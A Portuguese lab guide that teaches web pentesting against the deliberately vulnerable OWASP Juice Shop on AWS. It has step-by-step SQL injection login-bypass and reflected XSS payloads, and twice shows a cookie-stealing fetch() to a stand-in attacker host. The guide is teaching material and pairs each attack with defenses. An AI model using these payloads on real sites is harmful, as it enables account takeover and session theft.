# Guia de Laboratório: Introdução ao Pentest Web com OWASP Juice Shop

**Professor:** [Seu Nome]  
**Ambiente:** AWS Academy (EC2) + Kali Linux (VirtualBox)  
**Alvo:** OWASP Juice Shop

---

## Parte 1: Preparação da Infraestrutura (AWS)

Nesta etapa, prepararemos o servidor alvo. Faremos isso provisionando uma máquina virtual (EC2) na AWS e instalando o Juice Shop via Docker automaticamente.

### 1. Configuração da Instância EC2

1. Acesse o console da **AWS Academy Learner Lab**.
2. Vá para **EC2** → **Launch Instance**.
3. **Nome:** `Alvo-JuiceShop`.
4. **AMI:** Selecione **Ubuntu Server 22.04 LTS** (ou 24.04).
5. **Instance Type:** `t2.micro` ou `t2.small`.
6. **Key Pair:** Selecione `vockey` (padrão do Academy) ou crie uma nova se tiver permissão.

### 2. Configurações de Rede (Firewall)

1. Em **Network settings**, clique em "Edit".
2. Crie um novo Security Group.
3. Adicione uma regra:
   - **Type:** HTTP
   - **Port range:** 80
   - **Source:** `0.0.0.0/0` (Para facilitar o acesso de qualquer lugar) ou `My IP` (Para acesso restrito).

### 3. Script de Instalação Automática (User Data)

Role até o final da página, expanda **Advanced details** e cole o seguinte script no campo **User Data**. Este script atualizará o Ubuntu, instalará o Docker e subirá a aplicação na porta 80.

```
#!/bin/bash
# Atualiza repositórios e sistema
apt-get update -y
apt-get upgrade -y

# Instala dependências e o Docker
apt-get install -y docker.io

# Inicia e habilita o serviço do Docker
systemctl start docker
systemctl enable docker

# Baixa e executa o OWASP Juice Shop
# Mapeia a porta 80 da VM para a porta 3000 do container
docker run -d -p 80:3000 --restart always bkimminich/juice-shop
```

4. Clique em **Launch Instance**.
5. Aguarde cerca de 3 a 5 minutos para que a instância inicie e o script termine de rodar.
6. Copie o **Public IPv4 address** da sua instância.

---

## Parte 2: Configuração da Máquina Atacante (Kali Linux)

Assumindo que você já possui o Kali Linux rodando no VirtualBox.

1. **Verifique a conexão:** Abra o navegador (Firefox) no Kali e acesse `http://<IP-PUBLICO-DA-AWS>`.
   - *Sucesso:* Você deve ver a loja "OWASP Juice Shop".

2. **Prepare o Burp Suite:**
   - Abra o **Burp Suite Community** (pré-instalado no Kali).
   - Vá para a aba **Proxy** → **Intercept** e garanta que o botão esteja como **Intercept is off** (para navegar livremente no início).
   - Abra o navegador embutido do Burp ("Open Browser") ou configure o FoxyProxy no Firefox do Kali para apontar para `127.0.0.1:8080`.

---

## Parte 3: Experimentos de Pentest (OWASP Top 10)

### Experimento 1: Reconhecimento e Information Leakage

**Categoria:** *Security Misconfiguration / Information Gathering*

#### 📘 Conceito Teórico

Aplicações Web Modernas (SPAs - Single Page Applications) carregam muita lógica no lado do cliente (navegador). Desenvolvedores frequentemente deixam rotas, comentários ou lógicas sensíveis visíveis nos arquivos Javascript, assumindo que "se não tem link no menu, ninguém vai achar". Isso é "Segurança por Obscuridade", o que não é segurança real.

#### 🎯 Objetivo

Encontrar o "Score Board" (Placar de Pontuação) que está oculto no menu principal.

#### 🛠️ Prática

1. No navegador, acesse a página inicial do Juice Shop.

2. Clique com o botão direito em qualquer lugar e selecione **Inspect Element** (Inspecionar) ou pressione `F12`.

3. Vá para a aba **Debugger** (ou Sources no Chrome/Chromium).

4. Procure pelos arquivos Javascript carregados (geralmente em pastas como `assets/` ou na raiz `main-es20xx.js`).

5. Use a função de busca no código (`Ctrl+F`) e procure pelo termo `score`.

6. Você deve encontrar uma referência a uma rota/caminho chamado `score-board`.

7. **Exploit:** Modifique a URL no navegador para:
   ```
   http://<IP-PUBLICO-DA-AWS>/#/score-board
   ```

8. **Resultado:** O placar abre, você ganha seu primeiro desafio e confere seu progresso.

---

### Experimento 2: SQL Injection (Login Bypass)

**Categoria:** *A03:2021 – Injection*

#### 📘 Conceito Teórico

Injeção de SQL ocorre quando dados não confiáveis (input do usuário) são enviados para um interpretador de banco de dados como parte de um comando ou consulta. Se a aplicação não "sanitizar" (limpar) a entrada, o atacante pode manipular a consulta original. O clássico é alterar a lógica booleana de uma verificação de senha.

**Exemplo de Consulta Vulnerável:**

```
SELECT * FROM users WHERE email = '[INPUT_USUARIO]' AND password = '[SENHA]'
```

Se o usuário digitar `' or 1=1--` no campo email, a consulta vira:

```
SELECT * FROM users WHERE email = '' or 1=1--' AND password = '[SENHA]'
```

O `--` comenta o resto, e `or 1=1` sempre é verdadeiro, retornando o primeiro usuário (geralmente o admin).

#### 🎯 Objetivo

Logar como Administrador sem saber a senha.

#### 🛠️ Prática

1. Vá para a tela de **Login** do Juice Shop (`Account` → `Login`).

2. No campo **Email**, vamos inserir um payload que sempre retorna "Verdadeiro" para o banco de dados.

3. Digite: 
   ```
   ' or 1=1--
   ```
   - `'` : Fecha a string do campo de email na query SQL original.
   - `or 1=1`: Adiciona uma condição que é sempre verdadeira (1 é igual a 1).
   - `--`: Comenta o restante da query (ignorando a verificação de senha).

4. Digite qualquer coisa no campo de senha (ex: `123`).

5. Clique em **Log in**.

6. **Resultado:** Você deve logar como o usuário `admin@juice-sh.op`. Verifique na conta do usuário se você tem privilégios administrativos.

#### 💡 Lições Aprendidas

- Nunca confie em inputs do usuário.
- Use **Prepared Statements** ou **Parametrized Queries** (evitam injeções SQL).
- Implemente **Validação** de entrada (whitelist) e **Sanitização** de dados.

---

### Experimento 3: Cross-Site Scripting (XSS) Refletido

**Categoria:** *A03:2021 – Injection* (Antigo A07 - XSS)

#### 📘 Conceito Teórico

XSS ocorre quando uma aplicação inclui dados não confiáveis em uma página web sem validação adequada. Isso permite que o atacante execute scripts maliciosos no navegador da vítima. No XSS **Refletido**, o script malicioso vem da requisição atual (ex: um link malicioso enviado por email). 

Se a vítima clicar em um link como:
```
http://site.com/busca?q=<script>fetch('http://site-do-atacante.com?cookie='+document.cookie)</script>
```

O navegador executará o JavaScript e enviará os cookies de sessão para o atacante, permitindo roubo de conta.

#### 🎯 Objetivo

Executar um código JavaScript arbitrário (um `alert`) através da barra de busca.

#### 🛠️ Prática

1. Use a barra de pesquisa (**Search**) no topo da loja.

2. Pesquise por uma palavra normal, ex: `apple`. Note que a palavra aparece na tela: *"You searched for: apple"*.

3. Agora, vamos tentar injetar tags HTML. Pesquise por: 
   ```
   <h1>Teste</h1>
   ```
   - Se a palavra "Teste" ficar grande/negrito, significa que o site interpreta HTML na busca.

4. **Exploit:** Vamos injetar um script. O Juice Shop tem algumas proteções simples, então a tag `<script>` direta pode não funcionar no nível 1, mas o `iframe` costuma passar. Tente:
   ```
   <iframe src="javascript:alert('XSS')">
   ```

5. Pressione Enter.

6. **Resultado:** Um pop-up (alerta) deve aparecer na tela com a mensagem "XSS".

#### 💡 Impacto Real

Se isso fosse um ataque real, em vez de `alert`, o atacante poderia usar:

```javascript
fetch('http://site-do-atacante.com?cookie=' + document.cookie)
```

Isso roubaria a sessão do usuário autenticado. Com o cookie, o atacante pode se passar pelo usuário.

#### 🛡️ Defesa

- **Escape HTML:** Converta caracteres especiais (`<`, `>`, `"`, `&`) em entidades HTML (`&lt;`, `&gt;`, `&quot;`, `&amp;`).
- **Content Security Policy (CSP):** Configure cabeçalhos HTTP que bloqueiam scripts inline.
- **Validação:** Whitelist de caracteres permitidos (ex: apenas letras, números, hífens).

---

### Desafio Extra: Sensitive Data Exposure (Diretório FTP)

**Categoria:** *A05:2021 – Security Misconfiguration*

#### 📘 Conceito Teórico

Misconfigurações de segurança incluem deixar diretórios públicos acessíveis, senhas padrão ativas, ou informações sensíveis expostas. Servidores web mal configurados podem listar o conteúdo de diretórios, expondo arquivos de backup ou código-fonte.

#### 🎯 Objetivo

Descobrir e acessar informações sensíveis em um diretório público.

#### 🛠️ Prática

1. Tente acessar a URL:
   ```
   http://<IP-PUBLICO-DA-AWS>/ftp
   ```

2. O servidor não deveria listar arquivos de diretórios, mas lista. Você verá vários arquivos.

3. Explore os arquivos disponíveis:
   - `acquisitions.md`: Aviso legal e termos de serviço.
   - `eastere.gg`: Arquivo oculto com referências interessantes.
   - `package.json.bak`: **Crítico!** Este é um backup do arquivo de dependências.

4. Baixe `package.json.bak` e abra em um editor de texto.

5. **Análise:**
   - Veja as versões de todas as bibliotecas (Express, Sequelize, etc.).
   - Procure por versões antigas. Versões antigas possuem vulnerabilidades conhecidas.
   - Um banco de dados de vulnerabilidades (NVD - National Vulnerability Database) pode mostrar qual CVE (Common Vulnerabilities and Exposures) afeta aquela versão.

#### 💡 Lições Aprendidas

- Nunca deixe diretórios com "directory listing" habilitado em produção.
- Não versionize arquivos `.bak` ou `.old` em produção.
- Use um `.gitignore` adequado se a pasta for parte de um repositório público.
- Mantenha dependências atualizadas e faça auditorias regulares (use ferramentas como `npm audit` ou `snyk`).

---

## Resumo: Fases do Pentest Web

| Fase | Objetivo | Ferramentas |
|------|----------|-----------|
| **Reconhecimento** | Mapear a aplicação, encontrar pontos de entrada | DevTools, WireShark, Burp Suite (Sitemap) |
| **Scanning & Enumeração** | Identificar versões, tecnologias, diretórios | Burp Suite, OWASP ZAP, SQLMap, nikto |
| **Vulnerabilidade** | Confirmar falhas (SQL Injection, XSS, etc.) | Burp Suite Intruder, Scripts personalizados |
| **Exploração** | Executar ataques e ganhar acesso | Payload crafting, shells reverse |
| **Pós-Exploração** | Manter acesso, coletar dados, escalar privilégios | Lateral movement, privilege escalation |
| **Relatório** | Documentar achados e mitigações | Screenshots, CVSS score, recomendações |

---

## Conclusão

Parabéns! Você explorou falhas críticas reais em um ambiente controlado. Lembre-se:

- **Reconhecimento** é 80% do trabalho.
- **Injeções** (SQL e XSS) continuam sendo vetores de ataque extremamente comuns.
- Use este conhecimento para **proteger** aplicações, validando inputs e configurando servidores corretamente.
- A OWASP Top 10 é sua "bíblia" no mundo de segurança web.

---

## Referências

- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Juice Shop: https://owasp-juice.shop/
- Burp Suite Community: https://portswigger.net/burp/communitydownload
- OWASP ZAP: https://www.zaproxy.org/
- PortSwigger Web Security Academy: https://portswigger.net/web-security